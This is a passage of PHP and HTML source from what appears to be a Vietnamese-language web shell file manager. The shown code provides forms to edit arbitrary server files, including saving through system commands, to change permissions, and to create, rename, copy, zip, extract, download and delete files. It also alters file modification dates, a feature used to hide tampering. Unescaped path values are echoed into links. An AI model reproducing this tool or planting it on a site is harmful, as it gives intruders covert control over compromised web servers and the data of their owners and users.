                    $filePath = $path . "/" . $_GET["file"];
                    if(file_exists($filePath) && is_file($filePath) && is_writable($filePath)){
                        ob_start();
                        readfile($filePath);
                        $fileContent = ob_get_clean();
                ?>
                <div class="glass-effect rounded-2xl p-6 animate-fade-in">
                    <div class="flex items-center gap-3 mb-6">
                        <svg class="w-8 h-8 text-green-400" fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M11.32 6.176H5c-1.105 0-2 .949-2 2.118v10.588C3 20.052 3.895 21 5 21h11c1.105 0 2-.948 2-2.118v-7.75l-3.914 4.144A2.46 2.46 0 0 1 12.81 16l-2.681.568c-1.75.37-3.292-1.263-2.942-3.115l.536-2.839c.097-.512.335-.983.684-1.352l2.914-3.086Z" clip-rule="evenodd"/></svg>
                        <div>
                            <h2 class="text-2xl font-bold cyber-text-strong">Chỉnh Sửa Tập Tin</h2>
                            <p class="text-sm text-green-400/60">Đang chỉnh sửa: <code class="text-green-400/80"><?=htmlspecialchars($file)?></code></p>
                        </div>
                    </div>
                    
                    <form id="handle_file_edit" method="post" action="">
                        <div class="mb-6">
                            <label for="file_name_edit" class="block mb-3 text-sm font-medium text-green-400">Tên Tập Tin:</label>
                            <input type="text" id="file_name_edit" name="file_name" value="<?=$file?>" class="cyber-input block w-full p-4 text-sm rounded-xl" required>
                        </div>

                        <div class="mb-6">
                            <label for="edit_file_content" class="block mb-3 text-sm font-medium text-green-400">Nội Dung:</label>
                            <textarea id="edit_file_content" name="edit_file_content" rows="20" class="cyber-input block w-full p-4 text-sm rounded-xl font-mono"><?=htmlspecialchars($fileContent)?></textarea>
                        </div>

                        <div class="mb-6">
                            <label for="edit_file_method" class="block mb-3 text-sm font-medium text-green-400">Phương Thức Lưu:</label>
                            <select id="edit_file_method" name="edit_file_method" class="cyber-select block w-full p-4 text-sm rounded-xl">
                                <option value="basic">Sử dụng ghi tập tin cơ bản</option>
                                <option value="cmd">Sử dụng lệnh hệ thống</option>
                            </select>
                            <p class="mt-2 text-sm text-green-400/50">Lưu ý: Phương thức lệnh có thể thất bại với nội dung quá dài.</p>
                        </div>
                        
                        <button class="cyber-btn w-full text-black font-bold rounded-lg text-sm px-5 py-3.5" type="submit" name="editfile">
                            <span class="flex items-center justify-center gap-2">
                                <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7H5a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3m-1 4-7 7v3h3l7-7m-3-3 3 3"/></svg>
                                Lưu Thay Đổi
                            </span>
                        </button>
                    </form>
                </div>
                <?php
                    } else {
                        echo '<div class="glass-effect rounded-2xl p-12 text-center animate-fade-in"><svg class="w-16 h-16 text-red-400 mx-auto mb-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18 17.94 6M18 18 6.06 6"/></svg><h3 class="text-lg font-semibold text-red-400 mb-2">Không Thể Ghi Tập Tin</h3><p class="text-green-400/60">Tập tin không tồn tại hoặc không thể ghi</p></div>';
                    }
                }
                
                // ==================== CHMOD FILE FORM ====================
                elseif(isset($_GET["action"]) && $_GET["action"] === "chmodfile" && isset($_GET["file"])){
                    $filePath = $path . "/" . $file;
                    if(file_exists($filePath) && is_file($filePath)){
                ?>
                <div class="glass-effect rounded-2xl p-6 animate-fade-in">
                    <div class="flex items-center gap-3 mb-6">
                        <svg class="w-8 h-8 text-yellow-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v-3m0 0V9m0 3H9m3 0h3m-3 8a9 9 0 1 1 0-18 9 9 0 0 1 0 18Z"/></svg>
                        <div>
                            <h2 class="text-2xl font-bold text-yellow-400">Thay Đổi Phân Quyền Tập Tin</h2>
                            <p class="text-sm text-yellow-400/60">Tập tin: <code class="text-green-400/80"><?=htmlspecialchars($file)?></code></p>
                        </div>
                    </div>
                    
                    <form method="post" action="">
                        <div class="mb-6">
                            <label for="new_perms_file" class="block mb-3 text-sm font-medium text-green-400">Phân Quyền Mới (Bát Phân):</label>
                            <input type="text" id="new_perms_file" name="new_perms" class="cyber-input block w-full p-4 text-sm rounded-xl" value="<?=substr(sprintf('%o', @fileperms($filePath)), -4)?>" placeholder="ví dụ: 0644" required>
                            <p class="mt-2 text-sm text-green-400/50">Phân quyền hiện tại: <?=substr(sprintf('%o', @fileperms($filePath)), -4)?></p>
                            <button class="cyber-btn mt-4 w-full text-black font-bold rounded-lg text-sm px-5 py-3.5" type="submit" name="chmodfile">
                                <span class="flex items-center justify-center gap-2">
                                    <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v-3m0 0V9m0 3H9m3 0h3m-3 8a9 9 0 1 1 0-18 9 9 0 0 1 0 18Z"/></svg>
                                    Thay Đổi Phân Quyền
                                </span>
                            </button>
                        </div>
                    </form>
                </div>
                <?php
                    } else {
                        echo '<div class="glass-effect rounded-2xl p-12 text-center animate-fade-in"><svg class="w-16 h-16 text-red-400 mx-auto mb-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18 17.94 6M18 18 6.06 6"/></svg><h3 class="text-lg font-semibold text-red-400 mb-2">Không Tìm Thấy Tập Tin</h3><p class="text-green-400/60">Tập tin không tồn tại hoặc không thể ghi</p></div>';
                    }
                }
                
                // ==================== NEW FOLDER ====================
                elseif(isset($_GET["path"]) && @$_GET["action"] === "newfolder"){
                ?>
                <div class="glass-effect rounded-2xl p-6 animate-fade-in">
                    <div class="flex items-center gap-3 mb-6">
                        <svg class="w-8 h-8 text-green-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 10v6m-3-3h6m-9 8a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5.586a1 1 0 0 1 .707.293l5.414 5.414a1 1 0 0 1 .293.707V19a2 2 0 0 1-2 2H6Z"/></svg>
                        <div>
                            <h2 class="text-2xl font-bold cyber-text-strong">Tạo Thư Mục Mới</h2>
                            <p class="text-sm text-green-400/60">Tạo thư mục mới trong thư mục hiện tại</p>
                        </div>
                    </div>
                    
                    <form method="post" action="">
                        <div class="mb-6">
                            <label for="folder_name_new" class="block mb-3 text-sm font-medium text-green-400">Tên Thư Mục:</label>
                            <input type="text" id="folder_name_new" name="folder_name" class="cyber-input block w-full p-4 text-sm rounded-xl" placeholder="ten-thu-muc" required>
                            <button class="cyber-btn mt-4 w-full text-black font-bold rounded-lg text-sm px-5 py-3.5" type="submit" name="newfolder">
                                <span class="flex items-center justify-center gap-2">
                                    <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 10v6m-3-3h6m-9 8a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5.586a1 1 0 0 1 .707.293l5.414 5.414a1 1 0 0 1 .293.707V19a2 2 0 0 1-2 2H6Z"/></svg>
                                    Tạo Thư Mục
                                </span>
                            </button>
                        </div>
                    </form>
                </div>
                <?php
                }
                
                // ==================== RENAME FOLDER FORM ====================
                elseif(isset($_GET["action"]) && $_GET["action"] === "renamefolder" && isset($_GET["folder"])){
                    $folderPath = $path . "/" . $_GET["folder"];
                    if(file_exists($folderPath) && is_dir($folderPath) && is_writable($folderPath)){
                ?>
                <div class="glass-effect rounded-2xl p-6 animate-fade-in">
                    <div class="flex items-center gap-3 mb-6">
                        <svg class="w-8 h-8 text-green-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.779 17.779 4.36 19.918 6.5 13.5m4.279 4.279 8.364-8.643a3.027 3.027 0 0 0-2.14-5.165 3.03 3.03 0 0 0-2.14.886L6.5 13.5m4.279 4.279L6.499 13.5m2.14 2.14 6.213-6.504M12.75 7.04 17 11.28"/></svg>
                        <div>
                            <h2 class="text-2xl font-bold cyber-text-strong">Đổi Tên Thư Mục</h2>
                            <p class="text-sm text-green-400/60">Thư mục: <code class="text-green-400/80"><?=htmlspecialchars($_GET["folder"])?></code></p>
                        </div>
                    </div>
                    
                    <form method="post" action="">
                        <div class="mb-6">
                            <label for="new_name_folder" class="block mb-3 text-sm font-medium text-green-400">Tên Thư Mục Mới:</label>
                            <input type="text" id="new_name_folder" name="new_name" class="cyber-input block w-full p-4 text-sm rounded-xl" value="<?=htmlspecialchars($_GET["folder"])?>" required>
                            <button class="cyber-btn mt-4 w-full text-black font-bold rounded-lg text-sm px-5 py-3.5" type="submit" name="renamefolder">
                                <span class="flex items-center justify-center gap-2">
                                    <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.779 17.779 4.36 19.918 6.5 13.5m4.279 4.279 8.364-8.643a3.027 3.027 0 0 0-2.14-5.165 3.03 3.03 0 0 0-2.14.886L6.5 13.5m4.279 4.279L6.499 13.5m2.14 2.14 6.213-6.504M12.75 7.04 17 11.28"/></svg>
                                    Đổi Tên Thư Mục
                                </span>
                            </button>
                        </div>
                    </form>
                </div>
                <?php
                    } else {
                        echo '<div class="glass-effect rounded-2xl p-12 text-center animate-fade-in"><svg class="w-16 h-16 text-red-400 mx-auto mb-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18 17.94 6M18 18 6.06 6"/></svg><h3 class="text-lg font-semibold text-red-400 mb-2">Không Thể Ghi Thư Mục</h3><p class="text-green-400/60">Thư mục không tồn tại hoặc không thể ghi</p></div>';
                    }
                }
                
                // ==================== CHMOD FOLDER FORM ====================
                elseif(isset($_GET["action"]) && $_GET["action"] === "chmodfolder" && isset($_GET["folder"])){
                    $folderPath = $path . "/" . $_GET["folder"];
                    if(file_exists($folderPath) && is_dir($folderPath)){
                ?>
                <div class="glass-effect rounded-2xl p-6 animate-fade-in">
                    <div class="flex items-center gap-3 mb-6">
                        <svg class="w-8 h-8 text-yellow-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v-3m0 0V9m0 3H9m3 0h3m-3 8a9 9 0 1 1 0-18 9 9 0 0 1 0 18Z"/></svg>
                        <div>
                            <h2 class="text-2xl font-bold text-yellow-400">Thay Đổi Phân Quyền Thư Mục</h2>
                            <p class="text-sm text-yellow-400/60">Thư mục: <code class="text-green-400/80"><?=htmlspecialchars($_GET["folder"])?></code></p>
                        </div>
                    </div>
                    
                    <form method="post" action="">
                        <div class="mb-6">
                            <label for="new_perms_folder" class="block mb-3 text-sm font-medium text-green-400">Phân Quyền Mới (Bát Phân):</label>
                            <input type="text" id="new_perms_folder" name="new_perms" class="cyber-input block w-full p-4 text-sm rounded-xl" value="<?=substr(sprintf('%o', @fileperms($folderPath)), -4)?>" placeholder="ví dụ: 0755" required>
                            <p class="mt-2 text-sm text-green-400/50">Phân quyền hiện tại: <?=substr(sprintf('%o', @fileperms($folderPath)), -4)?></p>
                            <button class="cyber-btn mt-4 w-full text-black font-bold rounded-lg text-sm px-5 py-3.5" type="submit" name="chmodfolder">
                                <span class="flex items-center justify-center gap-2">
                                    <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v-3m0 0V9m0 3H9m3 0h3m-3 8a9 9 0 1 1 0-18 9 9 0 0 1 0 18Z"/></svg>
                                    Thay Đổi Phân Quyền
                                </span>
                            </button>
                        </div>
                    </form>
                </div>
                <?php
                    } else {
                        echo '<div class="glass-effect rounded-2xl p-12 text-center animate-fade-in"><svg class="w-16 h-16 text-red-400 mx-auto mb-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18 17.94 6M18 18 6.06 6"/></svg><h3 class="text-lg font-semibold text-red-400 mb-2">Không Tìm Thấy Thư Mục</h3><p class="text-green-400/60">Thư mục không tồn tại hoặc không thể ghi</p></div>';
                    }
                }
                
                // ==================== MAIN FILE BROWSER (DEFAULT) ====================
                else {
                ?>
                <!-- Quick Actions Bar -->
                <div class="flex flex-wrap gap-2 mb-4 animate-fade-in">
                    <button onclick="document.getElementById('upload-modal').classList.remove('hidden')" class="cyber-btn-outline flex items-center gap-2 px-4 py-2.5 rounded-lg text-sm font-medium">
                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 15v2a3 3 0 0 0 3 3h10a3 3 0 0 0 3-3v-2M12 4v12m0 0-4-4m4 4 4-4"/></svg>
                        Tải Lên
                    </button>
                    <a href="?path=<?=$path?>&action=newfile<?=$toPage?>" class="cyber-btn-outline flex items-center gap-2 px-4 py-2.5 rounded-lg text-sm font-medium no-underline">
                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4.5v15m7.5-7.5h-15"/></svg>
                        Tập Tin Mới
                    </a>
                    <a href="?path=<?=$path?>&action=newfolder<?=$toPage?>" class="cyber-btn-outline flex items-center gap-2 px-4 py-2.5 rounded-lg text-sm font-medium no-underline">
                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 10v6m-3-3h6m-9 8a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5.586a1 1 0 0 1 .707.293l5.414 5.414a1 1 0 0 1 .293.707V19a2 2 0 0 1-2 2H6Z"/></svg>
                        Thư Mục Mới
                    </a>
                    <?php if (isset($_SESSION['clipboard'])): ?>
                    <a href="?path=<?=$path?>&action=paste<?=$toPage?>" class="cyber-btn flex items-center gap-2 px-4 py-2.5 rounded-lg text-sm font-medium no-underline">
                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2h-2M9 5a2 2 0 0 0 2 2h2a2 2 0 0 0 2-2M9 5a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2"/></svg>
                        Dán (<?=$_SESSION['clipboard']['action'] === 'copy' ? 'Sao chép' : 'Di chuyển'?>: <?=htmlspecialchars(strlen($_SESSION['clipboard']['item']) > 15 ? substr($_SESSION['clipboard']['item'], 0, 15) . '...' : $_SESSION['clipboard']['item'])?>)
                    </a>
                    <?php endif; ?>
                </div>

                <!-- File Browser Table -->
                <div class="glass-effect rounded-2xl overflow-hidden animate-fade-in">
                    <?php if(@is_readable($path)): ?>
                        <div class="overflow-x-auto">
                            <table class="file-table w-full">
                                <thead>
                                    <tr>
                                        <th class="px-4 py-3 w-10 text-center"><input type="checkbox" id="checkAll" class="cyber-checkbox rounded bg-black/50 border-green-500/30 text-green-500 focus:ring-green-500/20" title="Chọn tất cả"></th>
                                        <th class="px-4 py-3 text-left">Tên</th>
                                        <th class="px-4 py-3 text-left hidden md:table-cell">Kích Thước</th>
                                        <th class="px-4 py-3 text-left hidden lg:table-cell">Chủ Sở Hữu / Nhóm</th>
                                        <th class="px-4 py-3 text-left hidden lg:table-cell">Thời Gian Sửa Đổi</th>
                                        <th class="px-4 py-3 text-left">Phân Quyền</th>
                                        <th class="px-4 py-3 text-right">Thao Tác</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php
                                    $itemsPerPage = 70;
                                    $allItems = scandir($path);
                                    $allItems = array_diff($allItems, ['.', '..']);
                                    if($search !== ''){
                                        $allItems = array_filter($allItems, function($item) use ($search) {
                                            return strpos(strtolower($item), $search) !== false;
                                        });
                                    }
                                    $allItems = array_values($allItems);
                                    $folders = [];
                                    $files = [];
                                    foreach($allItems as $item){
                                        if(is_dir($path . DIRECTORY_SEPARATOR . $item)){
                                            $folders[] = $item;
                                        } else {
                                            $files[] = $item;
                                        }
                                    }
                                    $sortedItems = array_merge($folders, $files);
                                    $totalItems = count($sortedItems);
                                    $totalPages = @ceil($totalItems / $itemsPerPage);
                                    $page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
                                    $offset = ($page - 1) * $itemsPerPage;
                                    $pagedItems = array_slice($sortedItems, $offset, $itemsPerPage);
                                    
                                    if(empty($pagedItems)){
                                        echo '<tr><td colspan="7" class="px-4 py-12 text-center text-green-400/40">
                                                <svg class="w-12 h-12 mx-auto mb-3 text-green-400/20" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M2.25 12.75V12A2.25 2.25 0 0 1 4.5 9.75h15A2.25 2.25 0 0 1 21.75 12v.75m-8.69-6.44-2.12-2.12a1.5 1.5 0 0 0-1.061-.44H4.5A2.25 2.25 0 0 0 2.25 6v12a2.25 2.25 0 0 0 2.25 2.25h15A2.25 2.25 0 0 0 21.75 18V9a2.25 2.25 0 0 0-2.25-2.25h-5.379a1.5 1.5 0 0 1-1.06-.44Z"/></svg>
                                                <p>Không tìm thấy tập tin hoặc thư mục nào</p>
                                              </td></tr>';
                                    }
                                    
                                    foreach($pagedItems as $item):
                                        $itemPath = $path . "/" . $item;
                                        $isDir = is_dir($itemPath);
                                        $perms = substr(sprintf('%o', @fileperms($itemPath)), -4);
                                        $isWritable = is_writable($itemPath);
                                    ?>
                                    <tr>
                                        <td class="px-4 py-3 text-center">
                                            <input type="checkbox" name="selected_items[]" value="<?=htmlspecialchars($item)?>" class="file-checkbox cyber-checkbox rounded bg-black/50 border-green-500/30 text-green-500 focus:ring-green-500/20">
                                        </td>
                                        <td class="px-4 py-3">
                                            <div class="flex items-center gap-3">
                                                <?php if($isDir): ?>
                                                    <svg class="w-5 h-5 text-yellow-400 shrink-0" fill="currentColor" viewBox="0 0 24 24">
                                                        <path fill-rule="evenodd" d="M3 6a2 2 0 0 1 2-2h5.532a2 2 0 0 1 1.536.72l1.9 2.28H3V6Zm0 3v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V9H3Z" clip-rule="evenodd"/>
                                                    </svg>
                                                <?php else: ?>
                                                    <svg class="w-5 h-5 text-blue-400 shrink-0" fill="currentColor" viewBox="0 0 24 24">
                                                        <path fill-rule="evenodd" d="M9 2.221V7H4.221a2 2 0 0 1 .365-.5L8.5 2.586A2 2 0 0 1 9 2.22ZM11 2v5a2 2 0 0 1-2 2H4v11a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2h-7Z" clip-rule="evenodd"/>
                                                    </svg>
                                                <?php endif; ?>
                                                <div class="min-w-0">
                                                    <a href="<?=$isDir ? "?path=" . $path . DIRECTORY_SEPARATOR . $item . "&search=" . $search : "?path=" . $path . "&file=" . $item . "&action=view&search=" . $search . $toPage?>" 
                                                       class="text-sm text-green-400 hover:text-green-300 truncate block max-w-[200px] no-underline font-medium">
                                                        <?=htmlspecialchars($item)?>
                                                    </a>
                                                </div>
                                            </div>
                                        </td>
                                        <td class="px-4 py-3 text-sm text-green-400/70 hidden md:table-cell font-mono">
                                            <?=$isDir ? '<span class="text-green-400/30">—</span>' : formatBytes(@filesize($itemPath))?>
                                        </td>
                                        <td class="px-4 py-3 text-sm text-green-400/70 hidden lg:table-cell font-mono">
                                            <?=gor($itemPath)?> / <?=ggr($itemPath)?>
                                        </td>
                                        <td class="px-4 py-3 text-sm text-green-400/70 hidden lg:table-cell cursor-pointer hover:text-green-400 transition-colors font-mono" 
                                            ondblclick="window.location.href='?path=<?=$path?>&item=<?=$item?>&action=changedate<?=$toPage?>'"
                                            title="Nhấn đúp để thay đổi ngày/giờ">
                                            <?=filedate($itemPath)?>
                                        </td>
                                        <td class="px-4 py-3">
                                            <span class="inline-flex text-xs px-2.5 py-1 rounded-full font-medium <?=$isWritable ? 'badge-writable' : 'badge-readonly'?>">
                                                <?=$perms?>
                                            </span>
                                        </td>
                                        <td class="px-4 py-3">
                                            <div class="flex items-center justify-end gap-1">
                                                <?php if($isDir): ?>
                                                    <a href="?path=<?=$path?>&item=<?=$item?>&action=copy&search=<?=$search . $toPage?>" class="action-icon no-underline" title="Sao chép">
                                                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 4h3a1 1 0 0 1 1 1v15a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1V16m14-2V7a1 1 0 0 0-1-1h-4m-5 5v5a1 1 0 0 0 1 1h4a1 1 0 0 0 1-1v-5a1 1 0 0 0-1-1H7a1 1 0 0 0-1 1Zm-5-5h3m-3 3h3"/></svg>
                                                    </a>
                                                    <a href="?path=<?=$path?>&item=<?=$item?>&action=cut&search=<?=$search . $toPage?>" class="action-icon no-underline" title="Cắt">
                                                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.079 6.839a3 3 0 0 0-4.255.1M10 18a3 3 0 1 0-6 0 3 3 0 0 0 6 0Zm8 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0ZM7 16l4-5m4 5-4-5m0 0V5"/></svg>
                                                    </a>
                                                    <a href="?path=<?=$path?>&item=<?=$item?>&action=compress&search=<?=$search . $toPage?>" class="action-icon no-underline" title="Nén ZIP">
                                                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7h8m-8 5h8m-8 5h8M21 5v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2Z"/></svg>
                                                    </a>
                                                    <a href="?path=<?=$path?>&folder=<?=$item?>&action=renamefolder&search=<?=$search . $toPage?>" class="action-icon no-underline" title="Đổi tên thư mục">
                                                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.779 17.779 4.36 19.918 6.5 13.5m4.279 4.279 8.364-8.643a3.027 3.027 0 0 0-2.14-5.165 3.03 3.03 0 0 0-2.14.886L6.5 13.5m4.279 4.279L6.499 13.5m2.14 2.14 6.213-6.504M12.75 7.04 17 11.28"/></svg>
                                                    </a>
                                                    <a href="?path=<?=$path?>&folder=<?=$item?>&action=chmodfolder&search=<?=$search . $toPage?>" class="action-icon no-underline" title="Phân quyền thư mục">
                                                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v-3m0 0V9m0 3H9m3 0h3m-3 8a9 9 0 1 1 0-18 9 9 0 0 1 0 18Z"/></svg>
                                                    </a>
                                                    <a href="?path=<?=$path?>&folder=<?=$item?>&action=deletefolder&search=<?=$search . $toPage?>" class="action-icon delete no-underline" title="Xóa thư mục" onclick="return confirm('Bạn có chắc chắn muốn xóa thư mục này?')">
                                                        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M8.586 2.586A2 2 0 0 1 10 2h4a2 2 0 0 1 2 2v2h3a1 1 0 1 1 0 2v12a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V8a1 1 0 0 1 0-2h3V4a2 2 0 0 1 .586-1.414ZM10 6h4V4h-4v2Zm1 4a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Zm4 0a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Z" clip-rule="evenodd"/></svg>
                                                    </a>
                                                <?php else: ?>
                                                    <a href="?path=<?=$path?>&item=<?=$item?>&action=copy&search=<?=$search . $toPage?>" class="action-icon no-underline" title="Sao chép">
                                                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 4h3a1 1 0 0 1 1 1v15a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1V16m14-2V7a1 1 0 0 0-1-1h-4m-5 5v5a1 1 0 0 0 1 1h4a1 1 0 0 0 1-1v-5a1 1 0 0 0-1-1H7a1 1 0 0 0-1 1Zm-5-5h3m-3 3h3"/></svg>
                                                    </a>
                                                    <a href="?path=<?=$path?>&item=<?=$item?>&action=cut&search=<?=$search . $toPage?>" class="action-icon no-underline" title="Cắt">
                                                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.079 6.839a3 3 0 0 0-4.255.1M10 18a3 3 0 1 0-6 0 3 3 0 0 0 6 0Zm8 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0ZM7 16l4-5m4 5-4-5m0 0V5"/></svg>
                                                    </a>
                                                    <a href="?path=<?=$path?>&item=<?=$item?>&action=compress&search=<?=$search . $toPage?>" class="action-icon no-underline" title="Nén ZIP">
                                                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7h8m-8 5h8m-8 5h8M21 5v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2Z"/></svg>
                                                    </a>
                                                    <?php if (strtolower(pathinfo($item, PATHINFO_EXTENSION)) === 'zip'): ?>
                                                    <a href="?path=<?=$path?>&item=<?=$item?>&action=extract&search=<?=$search . $toPage?>" class="action-icon no-underline" title="Giải nén ZIP">
                                                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v12m-3-3 3 3 3-3m-6-9V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v5"/></svg>
                                                    </a>
                                                    <?php endif; ?>
                                                    <a href="?path=<?=$path?>&file=<?=$item?>&action=edit&search=<?=$search . $toPage?>" class="action-icon no-underline" title="Chỉnh sửa tập tin">
                                                        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M11.32 6.176H5c-1.105 0-2 .949-2 2.118v10.588C3 20.052 3.895 21 5 21h11c1.105 0 2-.948 2-2.118v-7.75l-3.914 4.144A2.46 2.46 0 0 1 12.81 16l-2.681.568c-1.75.37-3.292-1.263-2.942-3.115l.536-2.839c.097-.512.335-.983.684-1.352l2.914-3.086Z" clip-rule="evenodd"/><path fill-rule="evenodd" d="M19.846 4.318a2.148 2.148 0 0 0-.437-.692 2.014 2.014 0 0 0-.654-.463 1.92 1.92 0 0 0-1.544 0 2.014 2.014 0 0 0-.654.463l-.546.578 2.852 3.02.546-.579a2.14 2.14 0 0 0 .437-.692 2.244 2.244 0 0 0 0-1.635ZM17.45 8.721 14.597 5.7 9.82 10.76a.54.54 0 0 0-.137.27l-.536 2.84c-.07.37.239.696.588.622l2.682-.567a.492.492 0 0 0 .255-.145l4.778-5.06Z" clip-rule="evenodd"/></svg>
                                                    </a>
                                                    <button onclick="postDownload('<?=addslashes($itemPath)?>')" class="action-icon" title="Tải xuống tập tin">
                                                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 15v2a3 3 0 0 0 3 3h10a3 3 0 0 0 3-3v-2m-8 1V4m0 12-4-4m4 4 4-4"/></svg>
                                                    </button>
                                                    <a href="?path=<?=$path?>&file=<?=$item?>&action=chmodfile&search=<?=$search . $toPage?>" class="action-icon no-underline" title="Phân quyền tập tin">
                                                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v-3m0 0V9m0 3H9m3 0h3m-3 8a9 9 0 1 1 0-18 9 9 0 0 1 0 18Z"/></svg>
                                                    </a>
                                                    <a href="?path=<?=$path?>&file=<?=$item?>&action=deletefile&search=<?=$search . $toPage?>" class="action-icon delete no-underline" title="Xóa tập tin" onclick="return confirm('Bạn có chắc chắn muốn xóa tập tin này?')">
                                                        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M8.586 2.586A2 2 0 0 1 10 2h4a2 2 0 0 1 2 2v2h3a1 1 0 1 1 0 2v12a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V8a1 1 0 0 1 0-2h3V4a2 2 0 0 1 .586-1.414ZM10 6h4V4h-4v2Zm1 4a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Zm4 0a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Z" clip-rule="evenodd"/></svg>
                                                    </a>
                                                <?php endif; ?>
                                            </div>
                                        </td>
                                    </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>
                        
                        <!-- Pagination -->
                        <?php if($totalPages > 1): ?>
                        <div class="flex items-center justify-between px-4 py-3 border-t border-green-500/10">
                            <span class="text-xs text-green-400/50">
                                Hiển thị <?=min($offset + 1, $totalItems)?>-<?=min($offset + $itemsPerPage, $totalItems)?> trong tổng số <?=$totalItems?> mục
                            </span>
                            <div class="flex gap-1">
                                <?php if($page > 1): ?>
